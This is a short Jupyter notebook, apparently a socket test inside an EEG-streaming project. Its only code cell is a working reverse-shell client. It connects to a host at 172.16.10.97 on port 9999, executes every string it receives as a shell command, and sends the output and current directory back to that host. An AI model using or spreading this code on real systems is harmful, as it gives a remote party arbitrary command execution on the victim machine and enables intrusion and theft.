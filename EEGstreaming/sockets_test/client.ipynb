{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import os\n",
    "import subprocess\n",
    "\n",
    "host='172.16.10.97'\n",
    "port= 9999\n",
    "s=socket.socket()\n",
    "s.connect((host,port))\n",
    "while True:\n",
    "    data=s.recv(1024)\n",
    "    if data[:2].decode('utf-8')=='cd':\n",
    "        os.chdir(data[3:].decode('utf-8'))\n",
    "        \n",
    "    if len(data)>0:\n",
    "        cmd=subprocess.Popen(data[:].decode('utf-8'),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE )\n",
    "        output_byte=cmd.stdout.read()+cmd.stderr.read()\n",
    "        output_str=str(output_byte,'utf-8')\n",
    "        currentwd=os.getcwd()+'>'\n",
    "        s.send(str.encode(output_str+currentwd))\n",
    "        print(output_str)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  },
  "widgets": {
   "application/vnd.jupyter.widget-state+json": {
    "state": {},
    "version_major": 2,
    "version_minor": 0
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
